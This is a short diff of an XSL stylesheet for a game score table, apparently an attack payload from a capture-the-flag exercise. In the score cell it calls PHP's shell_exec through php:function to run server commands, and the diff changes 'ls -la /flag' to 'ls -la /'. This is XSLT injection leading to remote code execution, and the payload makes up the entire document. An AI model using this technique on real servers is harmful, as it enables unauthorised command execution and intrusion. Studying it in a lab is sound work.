@@ -12,7 +12,7 @@
 			<xsl:for-each select="scores/score">
 				<tr>
 					<td><xsl:value-of select="game"/></td>
-					<td style="color: yellow;text-decoration: blink"><xsl:value-of select="php:function('shell_exec','ls -la /flag')"/></td>
+					<td style="color: yellow;text-decoration: blink"><xsl:value-of select="php:function('shell_exec','ls -la /')"/></td>
 				</tr>
 			</xsl:for-each>
 		</tbody>
